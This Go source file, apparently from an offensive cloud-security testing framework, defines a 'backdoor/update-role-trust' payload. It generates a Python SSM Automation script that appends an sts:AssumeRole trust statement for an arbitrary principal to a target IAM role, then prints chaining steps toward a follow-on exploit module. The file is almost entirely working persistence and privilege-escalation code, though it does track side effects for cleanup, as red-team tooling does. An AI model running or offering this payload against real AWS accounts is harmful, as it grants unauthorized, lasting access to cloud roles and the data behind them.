// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// AutomationBackdoorUpdateRoleTrustPayload appends a trust policy statement to an
// IAM role via an SSM Automation aws:executeScript Python step.
type AutomationBackdoorUpdateRoleTrustPayload struct{}

func init() {
	_ = payloads.Register(&AutomationBackdoorUpdateRoleTrustPayload{})
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Append a trust policy statement to an IAM role via SSM Automation Python step"
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSMAutomation,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "Name of the IAM role whose trust policy to modify",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	targetRole := options["TARGET_ROLE"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	code := fmt.Sprintf(`import boto3
import json

target_role = '%s'
trust_principal = '%s'
principal_key = '%s'

def script_handler(events, context):
    iam = boto3.client('iam')

    try:
        role_resp = iam.get_role(RoleName=target_role)
        role_arn = role_resp['Role']['Arn']
        current_policy = role_resp['Role']['AssumeRolePolicyDocument']

        new_stmt = {
            'Effect': 'Allow',
            'Principal': {principal_key: trust_principal},
            'Action': 'sts:AssumeRole',
        }
        current_policy['Statement'].append(new_stmt)

        iam.update_assume_role_policy(
            RoleName=target_role,
            PolicyDocument=json.dumps(current_policy),
        )

        return {
            'Status': 'Success',
            'TargetRole': target_role,
            'RoleArn': role_arn,
            'TrustPrincipal': trust_principal,
        }
    except Exception as e:
        return {'Status': 'Error', 'message': str(e)}
`, targetRole, trustPrincipal, principalKey)

	return code, nil
}

func (p *AutomationBackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	status := extractJSONField(result, "Status")
	if status == "Error" {
		errMsg := extractJSONField(result, "message")
		return fmt.Sprintf("Error updating trust policy: %s\n", errMsg), nil
	}

	roleARN := extractJSONField(result, "RoleArn")
	targetRole := extractJSONField(result, "TargetRole")
	trustPrincipal := extractJSONField(result, "TrustPrincipal")
	if roleARN == "" {
		return result, nil
	}

	return fmt.Sprintf("Trust policy updated: %s can now assume %s.\n\nRole ARN: %s\n\nNext steps:\n  use sts-001\n  set ROLE_ARN %s\n  exploit\n",
		trustPrincipal, targetRole, roleARN, roleARN), nil
}

// ReportSideEffects returns the trust policy modification as a tracked resource.
func (p *AutomationBackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy/%s", options["TARGET_ROLE"]),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"target_role":     options["TARGET_ROLE"],
				"trust_principal": options["TRUST_PRINCIPAL"],
				"original_policy": "retrieve via: aws iam get-role --role-name " + options["TARGET_ROLE"],
			},
		},
	}
}
